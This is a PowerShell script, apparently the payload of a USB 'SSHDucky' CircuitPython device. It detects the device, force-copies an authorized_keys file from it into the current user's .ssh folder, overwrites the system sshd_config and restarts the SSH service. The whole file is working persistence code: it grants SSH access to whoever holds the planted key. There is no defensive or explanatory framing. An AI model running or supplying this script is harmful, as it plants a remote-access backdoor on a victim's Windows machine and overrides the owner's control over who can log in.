# Specify the volume label of your CircuitPython device
$volumeLabel = "CIRCUITPY"

# Get the drive letter of the CircuitPython device
$driveLetter = (Get-Volume | Where-Object { $_.FileSystemLabel -eq $volumeLabel }).DriveLetter

if ($driveLetter) {
    # CircuitPython device found
    $sourceFolderPath = "$driveLetter" + ":" + "\SSHDucky\KeyConfig"

    # Get the current user's username
    $username = $env:USERNAME

    # Replace <username> with the current username
    $destinationFolderPath = "C:\Users\$username\.ssh"

    # Create the destination folder if it doesn't exist
    if (!(Test-Path $destinationFolderPath)) {
        New-Item -Path $destinationFolderPath -ItemType Directory | Out-Null
    }

    # Copy the authorized_keys file to the destination folder
    $authorizedKeysSourcePath = Join-Path -Path $sourceFolderPath -ChildPath "authorized_keys"
    $authorizedKeysDestinationPath = Join-Path -Path $destinationFolderPath -ChildPath "authorized_keys"

    Copy-Item -Path $authorizedKeysSourcePath -Destination $authorizedKeysDestinationPath -Force

    Write-Host "authorized_keys file copied successfully to: $authorizedKeysDestinationPath"

    # Replace the sshd_config file
    $sshdConfigSourcePath = Join-Path -Path $sourceFolderPath -ChildPath "sshd_config"
    $sshdConfigDestinationPath = "C:\ProgramData\ssh\sshd_config"

    # Replace the <username> placeholder in the sshd_config file
    (Get-Content -Path $sshdConfigSourcePath) | ForEach-Object { $_ -replace "<username>", $username } | Set-Content -Path $sshdConfigDestinationPath

    Restart-Service sshd

    Write-Host "sshd_config file replaced successfully at: $sshdConfigDestinationPath"
}
else {
    Write-Host "CircuitPython device not found."
}
